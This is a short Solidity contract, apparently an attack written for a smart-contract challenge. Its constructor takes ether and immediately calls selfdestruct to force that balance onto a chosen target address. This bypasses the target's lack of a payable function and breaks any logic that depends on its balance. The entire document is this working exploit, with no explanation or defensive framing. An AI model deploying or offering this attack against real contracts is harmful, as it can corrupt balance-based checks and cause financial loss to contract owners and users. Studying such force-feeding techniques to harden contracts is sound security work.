pragma solidity ^0.8.0;
contract DirectAttacker {
    address private immutable target;
    constructor(address _target) payable {
        target = payable(_target);
        selfdestruct(payable(target));
    }
}